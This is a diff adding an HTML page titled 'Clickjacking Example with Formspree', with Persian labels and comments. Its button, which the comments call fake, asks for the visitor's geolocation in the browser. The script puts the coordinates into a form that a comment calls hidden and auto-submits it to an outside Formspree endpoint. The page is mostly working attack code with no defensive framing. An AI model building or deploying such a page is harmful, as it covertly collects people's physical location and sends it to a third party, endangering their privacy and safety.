@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clickjacking Example with Formspree</title>
+  <style>
+    body {
+      text-align: center;
+      margin-top: 100px;
+      font-family: Tahoma, Arial, sans-serif;
+    }
+
+    #fakeButton {
+      position: relative;
+      z-index: 2;
+      padding: 20px 40px;
+      font-size: 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    #realForm {
+      position: absolute;
+      top: 200px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      height: auto;
+      opacity: 1;
+      z-index: 1;
+      pointer-events: auto;
+    }
+
+    p {
+      color: gray;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    #location {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h2>برای ارسال موقعیت مکانی، روی دکمه کلیک کنید!</h2>
+
+  <!-- دکمه جعلی -->
+  <button id="fakeButton">ارسال موقعیت مکانی</button>
+
+  <!-- فرم مخفی Formspree -->
+  <form id="realForm" action="https://formspree.io/f/xkgrwvde" method="POST">
+    <!-- فیلد موقعیت مکانی -->
+    <input type="text" name="location" id="locationInput" placeholder="موقعیت مکانی شما" required>
+    <input type="submit" value="ارسال">
+  </form>
+
+  <p id="statusMessage">اگر فرم ارسال نشد، لطفاً دوباره روی دکمه کلیک کنید.</p>
+
+  <script>
+    // وقتی روی دکمه جعلی کلیک شد، موقعیت مکانی کاربر گرفته می‌شود
+    document.getElementById('fakeButton').onclick = function() {
+      // درخواست موقعیت مکانی
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          // دریافت موقعیت مکانی و پر کردن فیلد موقعیت
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+          var location = "عرض جغرافیایی: " + latitude + ", طول جغرافیایی: " + longitude;
+
+          // قرار دادن موقعیت مکانی در فیلد
+          document.getElementById('locationInput').value = location;
+
+          // ارسال فرم
+          document.getElementById('realForm').submit();
+        }, function(error) {
+          document.getElementById('statusMessage').textContent = "خطا در دریافت موقعیت مکانی.";
+        });
+      } else {
+        document.getElementById('statusMessage').textContent = "مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.";
+      }
+    };
+  </script>
+</body>
+</html>
